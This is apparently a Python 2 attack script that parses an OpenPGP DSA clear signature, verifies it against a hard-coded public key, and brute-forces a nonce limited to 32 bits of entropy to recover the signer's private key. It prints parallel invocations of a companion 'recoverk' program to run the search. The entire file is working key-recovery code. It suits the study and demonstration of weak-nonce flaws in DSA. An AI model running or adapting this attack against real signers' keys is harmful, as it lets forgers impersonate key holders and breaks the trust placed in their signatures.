"""
Unpick a pgp clear signature in sigs/attack.asc

Verify it, then output commands to run recoverk.c
to do the recovery work in parallel.

If you change the key being attacked, you will need
to paste in the new public key and group below.
"""

import struct
from StringIO import StringIO as stringio
from collections import namedtuple
from hashlib import sha256
import multiprocessing
import dsa

# see rfc4880
OPENPGP_SIGNATURE = 2
OPENPGP_SIGNATURE_V4 = 4
OPENPGP_SIGNATURE_ON_CANON_TEXT = 1
OPENPGP_ALG_DSA = 17
OPENPGP_HASH_SHA256 = 8

OPENPGP_SUBPACKET_SIGCTIME = 2
OPENPGP_SUBPACKET_ISSUER = 16

# all this crap decodes a limited subset of OpenPGP so we can get the
# signed message and raw signature out. ugh!
def read_canon_lines_until(f, end):
    out = []

    while True:
        l = f.readline().rstrip('\n')
        if l == end:
            break
        out.append(l)

    return '\r\n'.join(out)

def read_text_sig(f):
    # extremely brittle attached-signature reading
    assert f.readline().strip() == '-----BEGIN PGP SIGNED MESSAGE-----'
    hh = f.readline().strip()
    assert hh.startswith('Hash: ')
    hh = hh[len('Hash: '):]

    f.readline()

    msg = read_canon_lines_until(f, '-----BEGIN PGP SIGNATURE-----')
    assert f.readline().strip() == 'Version: GnuPG v1'
    sig = read_canon_lines_until(f, '-----END PGP SIGNATURE-----')

    return hh, msg, sig.decode('base64')

def decode_openpgp_packet(d):
    f = stringio(d)

    tag = ord(f.read(1))

    # don't handle new fmt packets
    assert (tag >> 7) & 1 == 1
    assert (tag >> 6) & 1 == 0

    # or unlengthed packets
    lentype = tag & 3
    assert lentype in (0, 1, 2)

    ptype = tag >> 2 & 15

    if lentype == 0:
        plen = ord(f.read(1))
    elif lentype == 1:
        plen, = struct.unpack('>H', f.read(2))
    else:
        plen, = struct.unpack('>I', f.read(4))

    payload = f.read(plen)
    assert len(payload) == plen
    return ptype, payload

def decode_subp(body):
    ll, ty = struct.unpack('BB', body[:2])
    body = body[2:]

    assert ll < 192
    assert ty in (OPENPGP_SUBPACKET_SIGCTIME, OPENPGP_SUBPACKET_ISSUER)
    payl = body[:ll - 1]
    body = body[ll - 1:]

    if ty == OPENPGP_SUBPACKET_SIGCTIME:
        assert len(payl) == 4
    elif ty == OPENPGP_SUBPACKET_ISSUER:
        assert len(payl) == 8

    return (ll, ty, payl), body

def decode_subps(body):
    subplen, = struct.unpack('>H', body[:2])
    body = body[2:]

    contents = body[:subplen]
    body = body[subplen:]

    packets = []

    while len(contents):
        pp, contents = decode_subp(contents)
        packets.append(pp)

    return packets, body

def hash_subps(h, subps):
    for ll, ty, body in subps:
        h.update(struct.pack('>BB', ll, ty) + body)

def decode_mp(body):
    mpbits, = struct.unpack('>H', body[:2])
    body = body[2:]

    mpbytes = (mpbits + 7) / 8

    integer = body[:mpbytes]
    body = body[mpbytes:]

    return long('0x' + integer.encode('hex'), 16), body

def decode_dsa_sig_packet(sig):
    type, body = decode_openpgp_packet(sig)
    assert type == OPENPGP_SIGNATURE

    sigver, sigty, alg, halg = struct.unpack('BBBB', body[:4])
    hashed_hdr = body[:4]
    body = body[4:]
    assert sigver == OPENPGP_SIGNATURE_V4
    assert sigty == OPENPGP_SIGNATURE_ON_CANON_TEXT
    assert alg == OPENPGP_ALG_DSA
    assert halg == OPENPGP_HASH_SHA256

    hashed_subps_raw = body[:struct.unpack('>H', body[:2])[0] + 2]
    hashed_hdr += hashed_subps_raw

    hashed_subps, body = decode_subps(body)
    unhashed_subps, body = decode_subps(body)
    hash_hint, body = body[:2], body[2:]

    dsa_r, body = decode_mp(body)
    dsa_s, body = decode_mp(body)

    ty = namedtuple('dsasig', 'hashed_hdr hashed unhashed hash_hint dsa_r dsa_s')
    return ty._make((hashed_hdr, hashed_subps, unhashed_subps, hash_hint, dsa_r, dsa_s))

def search_k(group, mink, maxk, sig, h):
    precomp = dsa.prepare_recover_x(group, sig)
    print 'search from', '%08x..%08x' % (mink, maxk), 'starting'

    for k in xrange(mink, maxk):
        # k value has entropy at top 32 bits, and assume key has 256-bit q
        k = k << 224
        x = dsa.recover_x_given_sig_k(group, k, sig, h, precomp)

        # check if we got a working private key by checking if it yields
        # our known public value
        if pow(group.g, x, group.p) == pubkey:
            print 'found key, x =', x
            break

    print 'search from', '%08x..%08x' % (mink, maxk), 'finished'

with open('sigs/attack.asc', 'r') as f:
    hashfn, msg, sig = read_text_sig(f)
    assert hashfn == 'SHA256'
    dsa_sig = decode_dsa_sig_packet(sig)

    # recover input to dsa. weirdshit trailer is documented in rfc4880
    h = sha256()
    h.update(msg)
    h.update(dsa_sig.hashed_hdr)
    h.update('\x04\xff' + struct.pack('>I', len(dsa_sig.hashed_hdr)))

    signed_hash = h.hexdigest()
    assert signed_hash.startswith(dsa_sig.hash_hint.encode('hex'))

    # we need the group and public key. these are copy and pasted
    # from gpg --list-keys --with-key-data
    group = dsa.group(0xEFAA7C6712B7051C74B47CB4521833A339B8963AC81C7393D8AF569BCAF42B2403BBF098265394F055604C05F6CA8D355590F4F1FD40BA9A6E6FE4858279C005DD7FD236A5918F73884B8B4F852806C4B759FABBF367721397B6864D7B8820D15296594802A62F673E5BCC5B8A974DB6BFD530F383D3EA63178CDB5CE547532288387344BA0E0288178F81211D099B0A9BF072240F6A0CE4E7029CCA034B7887C3AF8C67C21F767262396ED63A6D61311661AACBC4455325236D58E286131C985DA6D83ADC03FA36921250F678EC1453199933ADC2E1187BA30C0AA13C9D7F1076C42F2F33EFD58E6778CCB81CF09B9D56184F2E5E8B54C0F0BE25C34EE092B7,
            0xF4EADB01CE599BE4472A92DD673660733D7A3690C1628D74C4A8AA8739B9577B,
            0x8B77977DFCB54A8215E1F899A726F9256340C65AD6481E0075AF770CCBC1143581F7D8F0ADE56FC7AE4F1909B0DEEA88B4F87510A91FB4A88E60EC8E5F6ECDC36274A3D4A34A4AEECC71F6BC5DE3F087E6DCD18BB1BDA5FE8B75C1BBF96BEFC4256C48A10B18DD3C47C80F47455FF1D5BBB8F37D6DCEBD47804062895D2B498E65C23C53D0541868DF2D2E781E8A5F5E34C0E72F78BBCEAB6BCFD5B4B11320C81424FDFA929BB999719BFAFE68F50C4AE93F5BBA5AF68A6D843EACEFABBDB43D4639C40851D2A367B0FFD7C0A47A196DEE67A86EED010483AC2CF0AF30BE799BF19ABF61078DAD7CE254C3565F998392B657F141826C30B666BDB1291DBD51FA)

    pubkey = 0x8E4602D95606287968CD3BDC48D6815304E53818EEB18B2F8D5A1B463747648A1F91DF4EDF7F559F4ABCEEDBD79DAF5CE028322B09B1E7F10C1C8BABC0986F4C94AB3E9FFCE240BA3A13E9B1D46F3D5F3D2ED1DD50803C1CCEFDE9E27A02A27322045F5E2AF6BC05A8544CA01DC3260385EBDC7345FA00D95E73793ED7FC5F86E4C3A8CAB13056A1B276A82E82FC3A3B7D5BE37511CE08F3D67FA8084DCB10C4F81E6E99147C317045E6447FF525721AAF247B2EC262FFD52BEB1B2FAA90430A5F1F48F07D2F02EAA6D0C746E708814D3DDD24DDE045E4864CA909C969B81CC6C5E3002C1E8E8F706FEC9ECF021F922D11BF0592AAED2C1561DDA2344ACA154

    sig = (dsa_sig.dsa_r, dsa_sig.dsa_s)
    pub = (group, pubkey)

    h = long(signed_hash, 16)
    dsa.verify(pub, sig, h)

    # search for k in chunks of this many values
    perjob = 0xffff
    def search_k_from(start):
        search_k(group, start, start + perjob, sig, h)

    # emit invocations of recoverk to do work
    for startk in xrange(0, 0xffffffff, perjob):
        print './recoverk', '%08x %08x' % (startk, startk + perjob), '%x %x %x' % (group.p, group.q, group.g), '%x' % pubkey, '%x %x' % (sig), '%x' % h

    if 0:
        # doing this in python is possible, but really slow
        pool = multiprocessing.Pool(6)
        pool.map(search_k_from,
                xrange(0, 0xffffffff, perjob))
